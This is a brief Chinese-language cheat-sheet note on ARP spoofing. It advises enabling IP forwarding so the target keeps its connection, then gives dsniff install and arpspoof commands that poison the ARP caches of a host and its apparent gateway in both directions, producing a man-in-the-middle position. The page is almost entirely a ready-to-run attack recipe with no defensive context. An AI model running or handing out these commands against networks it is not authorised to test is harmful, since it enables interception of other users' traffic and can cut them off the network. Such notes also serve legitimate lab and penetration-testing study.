# arp 

## arp欺骗

:::tip 提示
需要提前开启路由转发功能，否则目标主机会断网
:::

```shell
# sudo apt-get install dsniff
# 第一个ip是欺诈的主机, 第二个ip是要伪装的主机
# -i 为网口
sudo arpspoof -i enp4s0 -t 192.168.12.194 192.168.12.254
sudo arpspoof -i enp4s0 -t 192.168.12.254 192.168.12.194
```

